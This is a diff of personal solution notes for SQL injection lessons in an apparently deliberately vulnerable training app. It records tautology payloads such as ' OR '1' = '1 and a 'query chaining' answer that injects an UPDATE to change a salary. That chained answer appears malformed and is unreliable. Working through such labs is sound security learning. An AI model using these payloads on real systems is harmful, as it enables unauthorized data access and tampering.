@@ -1,8 +1,7 @@
 Introduction
 General
 -----------------------------
-(A1) Inection:
------SQL Injection
+(A1) Inection | SQL Injection
 2. Try to retrieve the department of the employee Bob Franco. Note that you have been granted full administrator privileges in this assignment and can access all data without authentication.
 SELECT department from employees where first_name='Bob'
 3. Try to change the department of Tobi Barnett to 'Sales'. Note that you have been granted full administrator privileges in this assignment and can access all data without authentication.
@@ -25,6 +24,18 @@ SELECT * From user_data WHERE Login_Count = 1 and userid= 0 OR 1 = 1
 "SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';
 Employee Name: 1
 Authentication TAN: ' OR '1' = '1
+12. Compromising Integrity with Query chaining.
+After compromising the confidentiality of data in the previous lesson, this time we are gonna compromise the integrity of data by using SQL query chaining.
+The integrity of any data can be compromised, if an attacker per example changes information that he should not even be able to access.
+You just found out that Tobi and Bob both seem to earn more money than you! Of course you cannot leave it at that.
+Better go and change your own salary so you are earning the most!
+Remember: Your name is John Smith and your current TAN is 3SL99A.
+
+Solution:
+Employee Name: SL99A'
+Authntication TAN: UPDATE Employees set SALARY = 90000 where USERID = 37648 --
+
+13.
 -----------------------------
 (2) Broken Authentication
 -----------------------------
